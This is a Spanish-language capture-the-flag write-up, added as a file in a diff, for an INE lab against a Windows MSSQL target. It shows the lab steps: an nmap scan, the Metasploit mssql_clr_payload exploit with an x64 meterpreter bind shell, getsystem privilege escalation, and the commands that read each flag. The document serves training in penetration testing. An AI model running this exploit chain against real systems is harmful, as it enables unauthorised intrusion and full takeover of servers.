@@ -1,0 +1,159 @@
+Completing Skill Check Labs
+
+Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.
+
+Lab Environment
+
+In this lab environment, you will have GUI access to a Kali machine. The target machine will be accessible at target.ine.local.
+
+Objective: Use Metasploit and manual investigation techniques to capture the following flags:
+
+Flag 1: Gain access to the MSSQLSERVER account on the target machine to retrieve the first flag.
+Flag 2: Locate the second flag within the Windows configuration folder.
+Flag 3: The third flag is also hidden within the system directory. Find it to uncover a hint for accessing the final flag.
+Flag 4: Investigate the Administrator directory to find the fourth flag.
+Tools
+
+The best tools for this lab are:
+
+Nmap
+Metasploit Framework
+mssql
+
+                Empezamos con la Flag 1
+
+Empezamos haciendo un NMAP scan
+        nmap -sV -sS -O -p- target.ine.local
+Aqui nos damos cuenta que nos sale el puerto y como se llama el servidor
+Abrimos el msfconsole
+        msfconsole
+        search Microsoft SQL Server 2012
+        use exploit/windows/mssql/mssql_clr_payload
+        set RHOSTS target.ine.local
+        exploit
+Nos saldra un error ya que nuestro target su arch es de x64
+        search /windows/x64/meterpreter
+        set PAYLOAD /windows/x64/meterpreter/bind_tcp
+        exploit
+Nos dara una session meterpreter 
+        shell
+        cd /
+        dir
+        type flag1.txt
+ENCONTRAMOS LA FLAG 1
+
+                Empezamos con flag 2
+
+Como nos estan diciendo que sigue estando en Windows configuration 
+        cd Windows
+        cd System32
+        dir /a:d
+        cd config
+Aqui no nos dejara porque dice ACCESS IS DENIED!
+Crearemos una sesion nueva en el mismo meterpreter con Control Z
+En meterpreter necesitamos tener los privilegios entonces los conseguiremos
+En meterpreter pondremos:
+        getprivs
+        getsystem
+        shell
+        cd config
+        type flag2.txt
+ENCONTRAMOS FLAG2
+        
+                Empezamos con la flag 3.
+
+La flag 3 dice que se esconde en el "System Directory", necesitamos hallarla para poder tambien tener acceso a la ultima flag.
+En la misma session podemos buscar dentro de system32
+        dir /a:d
+        cd drivers
+        cd etc
+        dir
+        type EscaltePrivilageToGetThisFlag.txt
+ENCONTRAMOS FLAG 3
+
+                Empezamos con la flag 4.
+Nos dicen que investiguemos el directory de ADMINISTRATOR
+        cd /
+        dir
+        cd Users
+        dir
+        cd Administrator
+        dir 
+        cd Desktop
+        dir
+        type flag4.txt
+ENCONTRAMOS FLAG 4
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
